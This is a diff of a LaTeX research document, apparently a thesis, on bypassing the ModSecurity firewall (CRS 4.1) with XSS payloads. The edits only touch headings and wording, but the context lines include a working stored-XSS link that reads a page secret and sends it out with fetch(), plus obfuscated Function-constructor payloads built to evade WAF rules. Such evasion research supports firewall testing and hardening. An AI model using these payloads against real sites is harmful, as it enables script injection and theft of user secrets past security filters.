@@ -78,7 +78,7 @@ On escaping the left parenthesis: \verb|(| in the javascript function \verb|aler
 and successfully bypasses the ModSecurity firewall using CRS4.1.
 
 
-\subsubsection{HTML encoding + JavaScript normal character escape}
+\subsubsection{HTML Character References + JavaScript normal character escape}
 \label{sec:htmlencjsesc}
 The following payload could be used by an attacker intending to employ stored XSS to exfiltrate secrets \cite{swigger/storedxss}.
 It was blocked by the ModSecurity firewall based on 4 rule triggers:
@@ -117,7 +117,7 @@ The bypassing payload:
 <a href=j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a>
 \end{lstlisting}
 
-\subsubsection{Function constructor + String concatenation + From charcode}
+\subsubsection{Function Constructor + String Concatenation + fromCharCode()}
 \label{sec:charcodemultiiter}
 Following up on the idea to split the character sequence \verb|String.fromCharCode| into multiple segments, which was stated during the single iteration evaluation under Section~\ref{sec:charcodesingleiter}, the payload:
 
@@ -200,7 +200,7 @@ Through substituting a part of the \verb|eval()| function, matches on \verb|eval
 
 
 
-\subsubsection{Function constructor + String concatenation}
+\subsubsection{Function Constructor + String Concatenation}
 \label{sec:funconstrconbypass}
 In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
 The basic implementation was blocked by the ModSecurity firewall:
@@ -318,7 +318,7 @@ Substitution of the second placeholder is possible because it happens inside a s
 
 \subsubsection{Avoiding \{\}}
 \label{sec:avoidingbypassB}
-A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string replace strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, the similar payload in Listing~\ref{lst:stringreplaceblocked} was being blocked by the modsecurity firewall:
+A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string substitution strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, the similar payload in Listing~\ref{lst:stringreplaceblocked} was being blocked by the modsecurity firewall:
 
 \begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} payload, label={lst:stringreplaceblocked}]
 <payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
@@ -328,7 +328,7 @@ A payload thats not using any \verb|{}| but still allows for Tagged Template Lit
 <MatchedData>"${2 2}"</MatchedData>
 \end{lstlisting}
 
-On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of
+On using a string substitution strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of
 
 \begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using square bracket notation, label={lst:stringreplacepass}]
 [][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
